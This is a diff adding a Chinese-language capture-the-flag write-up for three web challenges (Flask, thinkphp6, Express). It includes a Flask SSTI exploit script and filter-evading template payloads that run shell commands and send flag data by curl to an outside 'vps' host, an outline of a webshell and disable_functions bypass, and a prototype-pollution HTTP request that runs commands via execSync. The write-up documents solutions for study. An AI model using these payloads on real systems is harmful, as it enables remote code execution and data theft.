@@ -1225,3 +1225,74 @@ if __name__ == "__main__":
 	main(args['REMOTE'])
 ```
 
+## web
+
+### flask
+
+在base64解码的时候触发ssti
+
+先用脚本跑一下可以有os的类
+
+```python
+#python3
+import requests
+import base64
+import re
+
+def fun(x):
+	burp0_url = "http://123.57.212.112:10002/decode"
+	burp0_cookies = {"session": "eyJjc3JmX3Rva2VuIjoiY2JhMTI3ZjM5MTg5ZmQzNDczM2YxOTkxYmI0NmIwMjM5NzcwMTQ0MSJ9.XlIDQg.29GB0EtcYVkPk5a-U2qVRJHWJRQ"}
+	t=b'{{"".__class__.__mro__[1].__subclasses__().__getitem__(%d).__init__.__global__.__getitem__(\'os\')}}' % (x)
+	# print (t)
+	base=base64.b64encode(t)
+	burp0_data = {"csrf_token": "ImNiYTEyN2YzOTE4OWZkMzQ3MzNmMTk5MWJiNDZiMDIzOTc3MDE0NDEi.XlIDQg.XfNhMKYbzbvvAg0b9s12Oq-pN4A", "text": base, "submit": "\xe6\x8f\x90\xe4\xba\xa4"}
+	r=requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
+
+	res=r.content
+	pattern = re.compile(b'\xbc\x9a(.*?)div',re.DOTALL)
+	result0=pattern.findall(res)
+	print(result0[0])
+for i in range(257,258):
+	try:
+		print(i)
+		fun(i)
+	except Exception as e:
+		print(str(i)+" error")
+```
+
+
+
+过滤了一些关键词，没有回显的话，用curl数据外带 
+
+```python
+t=b"{{''.__class__.__mro__[1].__subclasses__().__getitem__(%d)|attr('_'+'_i'+'nit_'+'_')|attr('_'+'_g'+'lobals_'+'_')|attr('_'+'_getitem_'+'_')('o'+'s')|attr('sy'+'stem')('curl  \"vps:2333/`uname`\" -d \"`find /  | gr'+'ep fl'+'ag`\"')}}" % (x)
+t=b"{{''.__class__.__mro__[1].__subclasses__().__getitem__(%d)|attr('_'+'_i'+'nit_'+'_')|attr('_'+'_g'+'lobals_'+'_')|attr('_'+'_getitem_'+'_')('o'+'s')|attr('sy'+'stem')('curl  \"vps:2333/`uname`\" -d @/this_is_the_fl'+'ag.txt')}}" % (x)
+```
+
+
+
+### thinkphp6
+
+1.先session写webshell
+
+2.php垃圾回收bypass disable function
+
+### express
+
+用户名`admın`密码随意 去注册
+通过upperCase去登录admın会被转化成ADMIN
+
+注册之后，在action先原型链污染
+
+```http
+POST /action HTTP/1.1
+Host: 123.57.212.112:60072
+Content-Length: 159
+Content-Type: application/json
+Cookie: PHPSESSID=891b3e715aabd75a96325192c152d576; session=s%3AWiC-YKuehcnwSrF-EZFIR9i7Gi8YpqbE.5Xsy2FVe13ZWfgBP0NW9TuVLUfWt7cV7DJRtf3spElQ
+Connection: close
+
+{"Submit":"","lud":"1","__proto__":{"outputFunctionName":"a; return global.process.mainModule.constructor._load('child_process').execSync('cat /flag'); //"}}
+```
+
+再info页面查看flag
